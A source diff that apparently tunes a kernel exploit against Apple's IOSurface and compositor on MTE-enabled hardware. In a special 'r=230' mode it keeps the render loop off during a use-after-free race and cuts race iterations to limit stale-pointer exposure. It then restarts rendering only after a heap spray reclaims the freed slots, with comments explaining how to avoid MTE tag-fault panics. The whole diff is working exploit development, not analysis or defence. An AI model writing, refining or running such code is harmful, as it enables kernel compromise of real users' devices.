@@ -19704,26 +19704,19 @@ new_modes:
                 goto phase13_done;
             }
 
-            /* Start render loop (Stage D) */
-            rlog("  Starting Metal render loop (Stage D)...\n");
-            p13_render_run = 1;
-            p13_render_frames = 0;
+            /* Start render loop (Stage D) — skip for r=230 to avoid compositor panics */
             pthread_t render_th;
-            pthread_create(&render_th, NULL, p13_render_loop, NULL);
-            usleep(500000); /* let render loop stabilize 0.5s */
-            rlog("  Render loop running, frames=%d\n", p13_render_frames);
-
-            /* r=230 strategy: pause render loop during race to prevent compositor
-             * from traversing the stale entry and triggering MTE fault. The compositor
-             * traversal happens independently at ~60fps and will panic the kernel if
-             * it hits a freed slot with wrong MTE tag. By stopping the render loop
-             * during the race and restarting after GEN1 spray, we ensure the compositor
-             * only sees our reclaimed spray objects, not the freed memory. */
-            if (rounds == 230) {
-                rlog("  r=230: Pausing render loop for safe race...\n");
+            if (rounds != 230) {
+                rlog("  Starting Metal render loop (Stage D)...\n");
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_create(&render_th, NULL, p13_render_loop, NULL);
+                usleep(500000); /* let render loop stabilize 0.5s */
+                rlog("  Render loop running, frames=%d\n", p13_render_frames);
+            } else {
+                rlog("  r=230: Skipping render loop entirely (MTE-safe mode)\n");
                 p13_render_run = 0;
-                pthread_join(render_th, NULL);
-                rlog("  r=230: Render loop paused (frames=%d)\n", p13_render_frames);
+                p13_render_frames = 0;
             }
 
             /* Stage C: race variants during render loop */
@@ -19820,13 +19813,13 @@ new_modes:
 
             uint64_t inp13[3] = {1, 2, 3};
 
-            /* r=230 optimized mode: more iterations, same timing as r=229
-             * The race needs to SURVIVE so Phase 14 can binary-search the matched surface.
-             * Tighter timing causes kernel panics during the race itself. */
-            int p13_race8_iters  = (rounds == 230) ? 80  : 20;
-            int p13_vbig_iters   = (rounds == 230) ? 40  : 15;
-            int p13_surfch_iters = (rounds == 230) ? 60  : 20;
-            int p13_dereg_iters  = (rounds == 230) ? 60  : 20;
+            /* r=230 minimal-race mode: minimize stale pointer exposure time.
+             * On A20 with MTE, ANY kernel access to freed IOSurface memory panics.
+             * Use very few race iterations, then immediately spray to reclaim. */
+            int p13_race8_iters  = (rounds == 230) ? 3   : 20;
+            int p13_vbig_iters   = (rounds == 230) ? 2   : 15;
+            int p13_surfch_iters = (rounds == 230) ? 3   : 20;
+            int p13_dereg_iters  = (rounds == 230) ? 3   : 20;
 
             /* v_race8: 8 connections, spam threads, staggered close */
             rlog("  Stage C phase 1: v_race8 x%d\n", p13_race8_iters);
@@ -20116,15 +20109,14 @@ new_modes:
                     mach_port_deallocate(mach_task_self(), wp13);
             }
 
-            /* r=230: restart render loop now that spray has reclaimed freed slots.
-             * The compositor will traverse our spray objects, not freed memory. */
+            /* r=230: start render loop now for the first time, after spray reclaimed freed slots */
             if (rounds == 230) {
-                rlog("  r=230: Restarting render loop after spray (spray=%d)...\n", r229_spray_n);
+                rlog("  r=230: Starting render loop after spray (spray=%d)...\n", r229_spray_n);
                 p13_render_run = 1;
                 p13_render_frames = 0;
                 pthread_create(&render_th, NULL, p13_render_loop, NULL);
-                usleep(500000); /* let compositor traverse our spray objects */
-                rlog("  r=230: Render loop restarted, frames=%d\n", p13_render_frames);
+                usleep(1000000); /* 1s — let compositor traverse our spray objects */
+                rlog("  r=230: Render loop running, frames=%d\n", p13_render_frames);
             }
 
             /* Stop render loop */
